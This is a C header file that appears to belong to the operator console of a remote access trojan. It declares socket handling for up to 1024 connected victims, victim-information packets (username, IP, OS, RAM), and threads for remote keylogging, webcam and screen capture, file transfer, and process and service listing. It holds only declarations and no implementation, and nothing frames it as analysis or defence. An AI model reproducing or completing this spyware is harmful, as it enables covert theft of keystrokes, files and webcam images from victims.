#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <Tlhelp32.h>
#include <olectl.h>
#include <ole2.h>
#include <objbase.h>
#include <vfw.h>
#include <gdiplus.h>
#include <gdiplusenums.h>
#include <commctrl.h>
#include <Richedit.h>

//////////////////////////////////////////////////////////////////////////////// 
//Async Sockets
#define	RATMSG_SOCKET			WM_USER+1
////////////////////////////////////////////////////////////////
//Data
SOCKADDR_IN	    RemAdr;
SOCKET			hSock;
SOCKET			Server[1024];
SOCKET			FSock;
SOCKET			FClient[1024];
SOCKADDR_IN		ServAdr;
SOCKADDR_IN		ServAdress;
WORD			Event;
int				AdrLen=sizeof(sockaddr);
int				S = 0;
int				Connections = 0;
char ConnectionsA [15] = "";
SOCKET			FileServer[1024];
char * RecvBuffer;
char * Time;

////////////////////////////////////////////////////////////////////////////////
//Keylogger
DWORD dwTextColor = 65280;  
DWORD dwTimeColor = 255;  
DWORD dwTitleColor = 16777215;  
DWORD dwBackColor = 0; 
//////////////////////////////////////
typedef struct
{
	DWORD	PacketType;
	char    Data		[4096];
	int		ID;
	int		ID2;
	int		ID3;
}FBIPACKET;
int Listen = 0;
HINSTANCE GInstance;

typedef struct 
{
DWORD	PacketType;
	char	Buf [4096]; //res
	char	Buf1 [128]; //user lvl
	char    Buf2 [128]; //CPU
	char	Buf3 [128]; //ip / comp name
	char	Buf4 [128]; //OS / SP
	char	Buf5 [128]; //username
	char	Buf6 [128];	//Serverversion
	char	Buf7 [128];	//RAM
	int		ID;
	int		ID2;
	int		ID3;
}FBIPACKETA;
struct InfoStruct 
{
char ID [12];
char IP [18];
};
struct FileTransfer
{
	char Name [256];
	char Path [1024];
	int ItemIndex; 
	int FileID; 
	int ID;
};
int D = 0;
int A = 0;
int CUNT = 0;
FILE * DOWN [1024];
FILE * SCREENDOWN [1024];
FILE * WEBDOWN [1024];
FILE * Logs[1024];
////////////////////////////////////////////////////////////////
//HWND
HWND System[1024];
HWND File[1024];
HWND Screen[1024];
HWND Web[1024];
HWND FBI;
HWND Rename[1024];
HWND RenameF[1024];
HWND KeyHwnd[1024];
HWND PacketHwnd[1024];
HINSTANCE SysInst;
HINSTANCE CInst;
HINSTANCE ScreenInst;
HINSTANCE WebInst;
/////////////////////////////
//
HBITMAP ScreenA[1024];
HBITMAP WebA[1024];
/////////////////////////////
FBIPACKETA Information[1024];
int IC = 0;
//////////////////////
//Socket
void InitWSA();
bool InitSocket(HWND hwnd);
int FBISend(SOCKET sock, char MainData [4098],int ID, int ID2, int ID3,DWORD PacketType);
FBIPACKETA FBIRecv(SOCKET sock);
FBIPACKETA ParseData(char * main);
/////////////////////
//GUI
void SetServer(HWND HwND, char * ADMIN, char * ServerVersion, char * User, char * Country, char * ID);
void SetLog(char * Action, char * Result, char * Time, char * Client);
void GetTime();
//////////////////////////////
void SetProcess(char * Proc, char * PID, char * Threads, char * PPID, char * Priority, int ID);
void SetWindow(char * Window, int ID2, int ID);
void SetServiceGui(char * ServiceName, char * DisplayName, char * Status, char * StartType, int ID2, int ID);
void SetProgramGui(char * Program, char * DisplayName, int ID);
/////////////////////
void SetDriveWindow(char * Drive, int Type, int ID);
void SetFileWindow(char * Name, char * Size, int Image, int ID);
void SetFileSearch(char * File, int ID);
/////////////////////
DWORD WINAPI SystemWindow(LPVOID lpParam);
//Threads
DWORD WINAPI ScreenWindow(LPVOID lpParam);
DWORD WINAPI WebcamWindow(LPVOID lpParam);
DWORD WINAPI FileWindow(LPVOID lpParam);
DWORD WINAPI FileConnectWindow(LPVOID lpParam);
DWORD WINAPI SendFile(LPVOID lpParam);
DWORD WINAPI KeylogWindow(LPVOID lpParam);
DWORD WINAPI PacketWindow(LPVOID lpParam);
//
int hideandshow(char * text,char * hiddentext);
//
void SetKeylogger(char * Data, int ID);
void SetPacketWindow(char * Data, int ID);
void SetPortWindow(char * LocalIp, char * LocalPort, char * RemoteIp, char * RemotePort, char * Sate, int ID);
